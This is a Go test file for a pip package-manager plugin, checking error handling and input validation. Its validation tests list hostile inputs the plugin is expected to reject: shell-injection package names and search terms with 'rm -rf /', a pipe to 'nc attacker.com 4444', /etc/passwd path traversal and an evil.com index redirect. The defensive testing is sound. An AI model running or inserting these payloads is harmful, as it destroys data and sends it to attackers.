package main_test

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-pip"
	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
)

// Mock logger for PIP error handling tests
type MockPipLogger struct {
	messages []string
	errors   []string
	warnings []string
	silent   bool
}

func (m *MockPipLogger) Printf(format string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf(format, args...))
	}
}

func (m *MockPipLogger) Println(msg string, args ...any) {
	if !m.silent {
		if len(args) > 0 {
			m.messages = append(m.messages, fmt.Sprintf(msg, args...))
		} else {
			m.messages = append(m.messages, msg)
		}
	}
}

func (m *MockPipLogger) Success(msg string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf("SUCCESS: "+msg, args...))
	}
}

func (m *MockPipLogger) Warning(msg string, args ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, fmt.Sprintf(msg, args...))
	}
}

func (m *MockPipLogger) ErrorMsg(msg string, args ...any) {
	if !m.silent {
		m.errors = append(m.errors, fmt.Sprintf(msg, args...))
	}
}

func (m *MockPipLogger) Info(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "INFO: "+msg)
	}
}

func (m *MockPipLogger) Warn(msg string, keyvals ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, "WARN: "+msg)
	}
}

func (m *MockPipLogger) Error(msg string, err error, keyvals ...any) {
	if !m.silent {
		if err != nil {
			m.errors = append(m.errors, fmt.Sprintf("ERROR: %s - %v", msg, err))
		} else {
			m.errors = append(m.errors, "ERROR: "+msg)
		}
	}
}

func (m *MockPipLogger) Debug(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "DEBUG: "+msg)
	}
}

func (m *MockPipLogger) HasError(substring string) bool {
	for _, err := range m.errors {
		if strings.Contains(err, substring) {
			return true
		}
	}
	return false
}

func (m *MockPipLogger) HasWarning(substring string) bool {
	for _, warning := range m.warnings {
		if strings.Contains(warning, substring) {
			return true
		}
	}
	return false
}

func (m *MockPipLogger) Clear() {
	m.messages = nil
	m.errors = nil
	m.warnings = nil
}

var _ = Describe("PIP Plugin Error Handling", func() {
	var (
		plugin       *main.PipPlugin
		mockLogger   *MockPipLogger
		originalPath string
		tempDir      string
	)

	BeforeEach(func() {
		// Save original PATH and working directory
		originalPath = os.Getenv("PATH")

		// Create temporary directory for test files
		var err error
		tempDir, err = os.MkdirTemp("", "pip-test-")
		Expect(err).ToNot(HaveOccurred())

		// Create plugin with mock logger
		info := sdk.PluginInfo{
			Name:        "package-manager-pip",
			Version:     "test",
			Description: "Test PIP plugin for error handling",
		}

		plugin = &main.PipPlugin{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "pip"),
		}

		mockLogger = &MockPipLogger{}
		plugin.SetLogger(mockLogger)
	})

	AfterEach(func() {
		// Restore original PATH
		_ = os.Setenv("PATH", originalPath)

		// Clean up temp directory
		_ = os.RemoveAll(tempDir)

		mockLogger.Clear()
	})

	Describe("PyPI Network Connectivity Issues", func() {
		Context("when PyPI is unreachable", func() {
			It("should handle network failures during package installation", func() {
				err := plugin.Execute("install", []string{"nonexistent-package-12345-xyz"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("Could not find"),
						ContainSubstring("No matching distribution"),
						ContainSubstring("package"),
					))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should provide actionable errors for connection timeouts", func() {
				// Test with a package that might timeout
				err := plugin.Execute("install", []string{"some-package-that-might-timeout"})

				if err != nil && strings.Contains(strings.ToLower(err.Error()), "timeout") {
					Expect(err.Error()).To(ContainSubstring("timeout"))
					Expect(err.Error()).To(Not(ContainSubstring("nil pointer")))
				}
			})
		})

		Context("when index servers are unavailable", func() {
			It("should handle index server failures gracefully", func() {
				// Test pip index command which might fail
				err := plugin.Execute("search", []string{"test-package"})

				// Since pip search was disabled, this should handle gracefully
				if err == nil {
					// Should provide alternative suggestion
					Expect(mockLogger.messages).To(ContainElement(ContainSubstring("pypi.org/search")))
				}
			})
		})
	})

	Describe("Permission Errors", func() {
		Context("when installing to system Python without privileges", func() {
			It("should detect permission issues and suggest alternatives", func() {
				// Skip if running as root
				if os.Getuid() == 0 {
					Skip("Running as root - cannot test permission errors")
				}

				err := plugin.Execute("install", []string{"requests"})

				// Should either handle with --user flag or provide clear error
				if err != nil {
					errorMsg := strings.ToLower(err.Error())
					if strings.Contains(errorMsg, "permission") {
						// Should suggest using virtual environment or --user flag
						Expect(mockLogger.messages).To(SatisfyAny(
							ContainElement(ContainSubstring("virtual environment")),
							ContainElement(ContainSubstring("--user")),
						))
					}
				}
			})
		})

		Context("when modifying system packages", func() {
			It("should warn about system package modifications", func() {
				err := plugin.Execute("remove", []string{"pip"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Virtual Environment Issues", func() {
		Context("when virtual environment is corrupted", func() {
			It("should handle corrupted virtual environments gracefully", func() {
				// Test venv creation in temp directory
				venvPath := filepath.Join(tempDir, "test-venv")
				err := plugin.Execute("create-venv", []string{venvPath})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("runtime error")))
				}
			})
		})

		Context("when virtual environment is missing", func() {
			It("should detect missing virtual environment and provide guidance", func() {
				// Test operations that might require venv
				err := plugin.Execute("list", []string{})

				// Should handle missing venv gracefully
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Package Version Conflicts", func() {
		Context("when dependency conflicts occur", func() {
			It("should handle version conflicts gracefully", func() {
				// Test installing packages that might conflict
				err := plugin.Execute("install", []string{"package-with-conflicts==1.0.0"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})

			It("should provide helpful messages for incompatible versions", func() {
				err := plugin.Execute("install", []string{"requests==999.999.999"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("Could not find"),
						ContainSubstring("No matching distribution"),
						ContainSubstring("version"),
					))
				}
			})
		})
	})

	Describe("Requirements File Handling", func() {
		Context("when requirements.txt is malformed", func() {
			It("should handle invalid requirements file syntax", func() {
				// Create invalid requirements.txt
				reqFile := filepath.Join(tempDir, "requirements.txt")
				invalidContent := "invalid-syntax==>><<1.0.0\n../../../etc/passwd\npackage; rm -rf /"
				err := os.WriteFile(reqFile, []byte(invalidContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Change to temp directory to test requirements.txt detection
				originalDir, _ := os.Getwd()
				defer func() { _ = os.Chdir(originalDir) }()
				_ = os.Chdir(tempDir)

				err = plugin.Execute("install", []string{})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should handle missing requirements file gracefully", func() {
				// Change to temp directory with no requirements.txt
				originalDir, _ := os.Getwd()
				defer func() { _ = os.Chdir(originalDir) }()
				_ = os.Chdir(tempDir)

				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
				Expect(err.Error()).To(ContainSubstring("no requirements.txt found"))
			})
		})

		Context("when requirements file references unavailable packages", func() {
			It("should handle unavailable packages in requirements", func() {
				// Create requirements.txt with non-existent packages
				reqFile := filepath.Join(tempDir, "requirements.txt")
				content := "nonexistent-package-xyz==1.0.0\nanother-fake-package>=2.0.0"
				err := os.WriteFile(reqFile, []byte(content), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = plugin.Execute("install", []string{"-r", reqFile})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Invalid Input Handling", func() {
		Context("when provided with malicious package names", func() {
			It("should reject dangerous package name patterns", func() {
				dangerousNames := []string{
					"package; rm -rf /",
					"package && malicious-command",
					"package | nc attacker.com 4444",
					"../../../etc/passwd",
					"package$(rm -rf /)",
					"package`malicious-command`",
					"--trusted-host evil.com --index-url http://evil.com/simple/ requests",
				}

				for _, packageName := range dangerousNames {
					err := plugin.Execute("install", []string{packageName})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("invalid package name"),
						ContainSubstring("validation failed"),
					))
				}
			})

			It("should handle empty and whitespace package names", func() {
				invalidNames := []string{"", " ", "\t", "\n", "   \t\n   "}

				for _, packageName := range invalidNames {
					err := plugin.Execute("install", []string{packageName})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid package name"))
				}
			})

			It("should handle excessively long package names", func() {
				longName := strings.Repeat("a", 1000)
				err := plugin.Execute("install", []string{longName})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when no packages are specified", func() {
			It("should provide clear error for missing package arguments", func() {
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(SatisfyAny(
					ContainSubstring("no packages specified"),
					ContainSubstring("no requirements.txt found"),
				))

				err = plugin.Execute("remove", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
			})
		})
	})

	Describe("Disk Space and Resource Issues", func() {
		Context("when disk space is insufficient", func() {
			It("should handle disk full errors during installation", func() {
				// Test large package installation
				err := plugin.Execute("install", []string{"tensorflow"})

				if err != nil && strings.Contains(err.Error(), "No space left") {
					Expect(err.Error()).To(ContainSubstring("space"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when memory is limited", func() {
			It("should handle memory issues during package compilation", func() {
				// Test package that might require compilation
				err := plugin.Execute("install", []string{"cryptography"})

				if err != nil && strings.Contains(strings.ToLower(err.Error()), "memory") {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Python Environment Issues", func() {
		Context("when Python is missing or corrupted", func() {
			It("should handle missing Python interpreter", func() {
				// Temporarily modify PATH to simulate missing python
				_ = os.Setenv("PATH", "/nonexistent")

				err := plugin.Execute("list", []string{})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when pip is outdated or corrupted", func() {
			It("should handle pip upgrade failures", func() {
				err := plugin.Execute("update", []string{})

				// Should attempt to update pip but handle failures gracefully
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Package Management Operations", func() {
		Context("when updating all packages", func() {
			It("should handle update failures for individual packages", func() {
				err := plugin.Execute("update", []string{"--all"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when listing packages", func() {
			It("should handle pip list failures gracefully", func() {
				err := plugin.Execute("list", []string{"--outdated"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when checking if packages are installed", func() {
			It("should handle package existence checks", func() {
				err := plugin.Execute("is-installed", []string{"nonexistent-package"})

				// This command uses os.Exit, but we test the validation part
				if err != nil {
					Expect(err.Error()).To(ContainSubstring("invalid package name"))
				}
			})

			It("should handle missing package argument", func() {
				err := plugin.Execute("is-installed", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no package specified"))
			})
		})
	})

	Describe("Search Functionality", func() {
		Context("when search terms are invalid", func() {
			It("should handle invalid search terms", func() {
				dangerousSearchTerms := []string{
					"; rm -rf /",
					"&& malicious-command",
					"| nc attacker.com 4444",
					"$(evil-command)",
					"`malicious`",
				}

				for _, term := range dangerousSearchTerms {
					err := plugin.Execute("search", []string{term})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid search term"))
				}
			})

			It("should handle empty search terms", func() {
				err := plugin.Execute("search", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no search term specified"))
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("error messages should be actionable", func() {
			It("should provide specific guidance for common pip errors", func() {
				err := plugin.Execute("install", []string{"nonexistent-package-12345"})

				if err != nil {
					errorMsg := err.Error()

					// Should not contain low-level Python traceback details
					Expect(errorMsg).To(Not(ContainSubstring("Traceback")))
					Expect(errorMsg).To(Not(ContainSubstring("File \"")))
					Expect(errorMsg).To(Not(ContainSubstring("line ")))
					Expect(errorMsg).To(Not(ContainSubstring("TypeError")))
					Expect(errorMsg).To(Not(ContainSubstring("AttributeError")))

					// Should be informative
					Expect(len(errorMsg)).To(BeNumerically(">", 10))
				}
			})

			It("should include package context in error messages", func() {
				packageName := "test-invalid-package-xyz"
				err := plugin.Execute("install", []string{packageName})

				if err != nil {
					errorMsg := err.Error()

					// Should provide context about what failed
					Expect(errorMsg).To(Not(Equal("error")))
					Expect(errorMsg).To(Not(Equal("failed")))
					Expect(errorMsg).To(Not(BeEmpty()))
				}
			})
		})

		Context("when virtual environment status is unclear", func() {
			It("should provide clear virtual environment status messages", func() {
				_ = plugin.Execute("list", []string{})

				// Should indicate whether in virtual environment or system Python
				foundVenvMessage := false
				for _, msg := range mockLogger.messages {
					if strings.Contains(msg, "virtual environment") || strings.Contains(msg, "System Python") {
						foundVenvMessage = true
						break
					}
				}
				Expect(foundVenvMessage).To(BeTrue())
			})
		})
	})

	Describe("Unknown Command Handling", func() {
		Context("when executing unknown commands", func() {
			It("should return helpful error for unknown commands", func() {
				err := plugin.Execute("invalid-pip-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
				Expect(err.Error()).To(ContainSubstring("invalid-pip-command"))
			})
		})
	})

	Describe("Freeze and Requirements Generation", func() {
		Context("when generating requirements", func() {
			It("should handle freeze command failures", func() {
				err := plugin.Execute("freeze", []string{})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})
})

// Performance and stress testing for PIP error conditions
var _ = Describe("PIP Plugin Stress Testing", func() {
	var plugin *main.PipPlugin

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "package-manager-pip",
			Version:     "test",
			Description: "Stress test PIP plugin",
		}

		plugin = &main.PipPlugin{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "pip"),
		}

		mockLogger := &MockPipLogger{silent: true} // Silent for performance tests
		plugin.SetLogger(mockLogger)
	})

	Context("handling many concurrent operations", func() {
		It("should not deadlock with concurrent pip commands", func() {
			done := make(chan bool, 5)

			// Launch concurrent pip operations
			operations := [][]string{
				{"list"},
				{"list", "--outdated"},
				{"freeze"},
			}

			for _, args := range operations {
				go func(arguments []string) {
					defer GinkgoRecover()
					command := arguments[0]
					args := arguments[1:]
					err := plugin.Execute(command, args)
					// Errors are expected in test environment
					_ = err
					done <- true
				}(args)
			}

			// Wait for all operations to complete
			for range operations {
				Eventually(done).Should(Receive())
			}
		})
	})

	Context("handling rapid repeated operations", func() {
		It("should handle rapid pip list commands without leaks", func() {
			for i := 0; i < 20; i++ {
				err := plugin.Execute("list", []string{})
				// Errors are acceptable, testing for stability
				_ = err
			}
		})
	})

	Context("handling large package lists", func() {
		It("should handle operations with many packages", func() {
			// Test with many package names
			var packages []string
			for i := 0; i < 30; i++ {
				packages = append(packages, fmt.Sprintf("package-%d", i))
			}

			err := plugin.Execute("install", packages)
			if err != nil {
				Expect(err.Error()).To(Not(ContainSubstring("panic")))
			}
		})
	})
})
